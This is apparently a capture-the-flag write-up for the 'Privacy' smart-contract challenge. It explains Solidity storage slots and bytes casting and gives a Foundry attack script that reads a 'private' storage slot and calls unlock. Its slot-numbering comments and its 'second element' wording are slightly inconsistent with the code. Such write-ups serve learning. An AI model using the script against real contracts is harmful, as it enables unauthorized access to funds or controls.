# Privacy   
Our mission here is to unlock the contract by changing the variable `locked` from `true` to `false`.
As the description says, "We need to understand how storage works". A must-read is this article from Alchemy: Smart Contract Storage Layout.
Since we have to read the second element of the `data` array, we can see that it'll be in the 5th storage slot:
```solidity
bool public locked = true; // slot 1
uint256 public ID = block.timestamp; // slot 2
uint8 private flattening = 10; // slot3
uint8 private denomination = 255; // slot3
uint16 private awkwardness = uint16(block.timestamp); // slot3
bytes32[3] private data; // slots 4-6
```
We also need to understand how casting works. For this case, we need to know how casting from `bytes32` to `bytes16` works. In this case, `bytes16` will keep the 16 most significant bytes (the leftmost bytes).
For solving this challenge, we have to read the storage and perform the casting. I wrote a script that automates all of this: 
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
	
	address instance = /* Your instance address */;	

	function run() public {
	bytes32 secret = vm.load( instance, bytes32(uint256(5)) ); //vm.load loads the value from storage at fifth slot
	vm.startBroadcast();
	instance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(secret)));
	vm.stopBroadcast();
	}
}
```
